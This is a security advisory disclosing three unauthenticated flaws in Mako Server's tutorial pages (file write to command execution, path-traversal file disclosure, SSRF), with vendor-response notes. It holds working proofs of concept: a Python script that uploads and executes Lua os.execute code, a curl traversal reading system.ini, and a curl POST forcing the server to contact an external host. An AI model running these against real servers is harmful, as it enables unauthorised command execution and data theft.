Vulnerabilities Summary
The following advisory describe three (3) vulnerabilities found in Mako Server’s tutorial page.
 
The vulnerabilities found are:
 
Unauthenticated Arbitrary File Write vulnerability that leads to Remote Command Execution
Unauthenticated File Disclosure
Unauthenticated Server Side Request Forgery
As these tutorial may be used as the basis for production code, it is important for users to be aware of these issues.
 
“As a compact application and web server, the Mako Server helps developers rapidly design secure IoT and web applications. The Mako Server provides
an application server environment from which developers can design and implement complete, custom solutions. The Mako Web Server is ideal for embedded Linux systems.”

Vendor response
 
RealTimeLogic was informed of the vulnerability on Aug 13, but while acknowledging the receipt of the vulnerability information, refused to respond to the
technical claims, to give a fix timeline or coordinate an advisory, saying:
 
“I just sent a formal notification for the commercial license requirement and also we need to put a maintenance contract in place.
Internally I need to set-up a cost allocation account for billing against these support inquiries.”
 
At this time it’s unclear whether these vulnerabilities are going to be fixed and further attempts to get a status clarification failed.
 
 
Vulnerabilities details
 
Unauthenticated Arbitrary File Write vulnerability that leads to Remote Command Execution:
 
Mako web-server tutorial does not sufficiently sanitizing the HTTP PUT requests, when an attacker send HTTP PUT request to ‘save.lsp‘ web page, the input passed
to a function responsible for accessing the filesystem.
 
The attacker input will be saved on the victims machine and can be execute by sending HTTP GET request to ‘manage.lsp‘
 
 
HTTP PUT  &#039;http://VICTIM-IP/examples/save.lsp?ex=2.1&#039;
HTTP GET  &#039;http://VICTIM-IP/examples/manage.lsp?execute=true&ex=2.1&type=lua&#039;
 
 
Proof of Concept
 
 
import urllib2,time
 
#MakoServer v2.5 Remote Command Execution 0day

#=========================================
 
print  &#039;MakoServer v2.5 Remote Command Execution&#039;
 
CMD="os.execute(&#039;c:/Windows/system32/calc.exe&#039;)"
 
opener = urllib2.build_opener(urllib2.HTTPHandler)
request = urllib2.Request(&#039;http://IP/examples/save.lsp?ex=2.1&#039;, data=CMD)
request.add_header(&#039;Content-Type&#039;, &#039;text/plain;charset=UTF-8&#039;)

opener.open(request)
 
time.sleep(1)
 
urllib2.urlopen(&#039;http://IP/examples/manage.lsp?execute=true&ex=2.1&type=lua&#039;)
 
 
 
Unauthenticated File Disclosure
 
Mako web-server tutorial is not sufficiently sanitizing GET requests, when an attacker send GET request to the URI IP/fs/../.., the input passed
without modification and the response with the file content is returned.
 
Proof of Concept
The following GET request will response with the C/Windows/system.ini content:
 
curl -v http://VICTIM-IP/fs/C/Windows/system.ini
 
* About to connect() to VICTIM-IP port 80
*   Trying VICTIM-IP... connected
* Connected to VICTIM-IP (VICTIM-IP) port 80
> GET /fs/C/Windows/system.ini HTTP/1.1
> User-Agent: curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5
> Host: VICTIM-IP

Server Side Request Forgery
 
Mako web-server tutorial is not sufficiently sanitizing incoming POST requests, when an attacker sends an POST request to the ‘rtl/appmgr/new-application.lsp‘
URI, the input will be executed and the server will connect to the attacker’s machine.
 
Proof of Concept
Start Wireshark to see successful connections made from Mako Web Server victim machine.
 
Initiate requests from another machine using CURL:
 
curl -v -X POST http://VICTIM-IP/rtl/appmgr/new-application.lsp -d io=net -d path=http://EXTERNAL-IP
